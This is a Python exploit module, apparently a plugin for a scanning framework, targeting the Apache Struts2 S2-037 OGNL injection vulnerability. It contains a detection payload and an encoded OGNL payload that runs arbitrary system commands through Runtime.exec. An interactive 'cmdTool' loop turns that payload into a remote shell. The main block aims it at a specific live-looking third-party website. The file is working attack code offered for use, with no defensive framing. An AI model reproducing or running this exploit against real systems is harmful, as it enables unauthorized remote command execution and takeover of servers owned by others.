#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
from lib.core.data import logger


readme = {
    "url": "target url"
}

# PoC
s2037_poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"

# CommandExP
cmd_exp = "/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=ShowMeCommand"

headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
            'Cookie': 'JSESSIONID=75C9ED1CD9345875BC5328D73DC76812',
            'referer': 'http://www.baidu.com/',
}


def verity(url):
    try:
        poc_url = url+s2037_poc
        msg = "Struts2_S2-037_CmdToolExP_POC checking %s ..." % url
        logger.info(msg)
        s = requests.session()
        res = s.post(poc_url, timeout=4)
        if res.status_code == 200 and "25F9E794323B453885F5181F1B624D0B" in res.content:
            if len(res.content) <40: # 34 length
                return True
            else:
                return False
        else:
            return False

    except Exception, e:
        logger.warning("Failed to connection target")
        return False


def cmdTool(exp_url):
    get_url_exp = exp_url + cmd_exp
    while True:
        comm = raw_input("~$ ")
        if comm == "q":
            return
        temp_exp = get_url_exp.replace("ShowMeCommand", comm)
        try:
            print "="*80
            print "[Result]"
            print "_"*80
            r = requests.get(temp_exp, headers=headers, timeout=5)
            resp = r.text.encode("utf-8")
            print resp
            print "="*80
        except:
            logger.warning("error,try again..")



def poc(target):
    res = verity(target)
    if res:
        logger.success("%s is vulnerable S2-037." % target)
    else:
        logger.warning("%s is not vulnerable S2-037." % target)
    return res


def run(arg):
    url = arg["url"]
    if verity(url):
        logger.success("%s is vulnerable S2-037." % url)
        logger.info("The next to enter cmdExp, 'q' will quit")
        cmdTool(url)
    else:
        logger.warning("%s is not vulnerable S2-037." % url)


if __name__ == '__main__':
    poc("http://www.sdf.dsfe")
    run({"url": "http://ycjy.scezju.com/jjxt/yhLogin.action"})
    cmdTool("http://ycjy.scezju.com/jjxt/yhLogin.action")
